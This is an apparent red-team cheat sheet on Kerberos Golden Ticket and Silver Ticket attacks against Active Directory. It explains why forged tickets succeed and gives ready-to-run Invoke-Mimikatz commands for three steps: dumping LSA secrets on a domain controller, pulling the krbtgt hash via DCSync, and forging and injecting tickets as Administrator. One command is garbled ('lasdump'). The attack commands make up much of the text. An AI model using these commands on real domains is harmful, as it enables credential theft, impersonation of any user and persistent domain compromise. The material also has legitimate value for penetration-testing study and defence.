# Golden Ticket Attack

## A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valiod TGT ticket 
## Since user account validation is not done by Domain Controller (KDC Service) until TGT is older than 20 minutes, we can even use deleted/revoked accounts

## The KRBTGT user hash could be used to impersonate any user with any privileges from even a non-domain machine
## Single Password Change has no effect on this attack
## A Couple of examples of commands

# Execute Mimikatz on DC
Invoke-Mimikatz -Command '"lasdump::lsa /patch"' -Computername dc01

# Execute MimiKatz on any machine
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:victim.local /sid:<domain sid> /krbtgt:<krbtgt ntlm hash> /id:500 /groups:513 /ptt"'

# To use the DCSync feature for getting krbtgt hash, execute the below command with DA privileges for ops domain
Invoke-Mimikatz -Command '"lsadump::dcsync /user:victim.local\krbtgt"'

# Silver Ticket Attack

## A Valid TGS (Golden Ticket is TGT)
## Encrypted and Signed by the NTLM hash of the service account - 
## (Golden Ticket is signed by the hash of the KRBTGT) of the service running with that account
## Services rarely check PAC (Privileged Attribute Certificate)
## Services will allow access only to the services themselves

# Create Silver ticket
Invoke-MimiKatz -Command '"kerberos::golden /domain:victim.local /sid:<domain sid> /target:<target machine> /service:cifs /rc4:<NTLM hash of machine account> /id:500 /user:Administrator /ptt"'
